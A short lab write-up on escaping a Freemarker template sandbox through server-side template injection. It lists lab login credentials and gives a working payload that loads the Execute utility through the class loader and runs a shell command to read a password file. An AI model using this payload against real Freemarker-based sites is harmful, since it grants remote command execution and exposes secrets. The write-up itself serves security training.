Description:
This lab uses the Freemarker template engine and is vulnerable to Server-Side Template Injection (SSTI) due to a poorly implemented sandbox.
The goal is to escape the sandbox and read the contents of a sensitive file.

Steps to Solve:
1️-Identify Available Objects
-Log in using:
content-manager:C0nt3ntM4n4g3r
-Edit a product description template.
-Notice that you have access to objects such as:
article / product

2️-Confirm SSTI & Method Access
-Test basic method access:
${article.class}
-Confirms that reflection is possible.

3️-Bypass the Sandbox
Use a known exploit from PayloadsAllTheThings to:
-Access the class loader
-Load dangerous classes
-Instantiate Execute utility

4️-Exploit Payload:
<#assign classloader=article.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
<#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
<#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>
${dwf.newInstance(ec,null)("cat my_password.txt")}

5️-Execute the Payload
-Insert the payload into the template.
-Save and reload the product page.

6️-Retrieve the Result
-The output will display the contents of:
my_password.txt
-Copy the result and submit it.

Result:
-Successfully bypassed the Freemarker sandbox
-Achieved command execution
-Retrieved sensitive file content:
my_password.txt
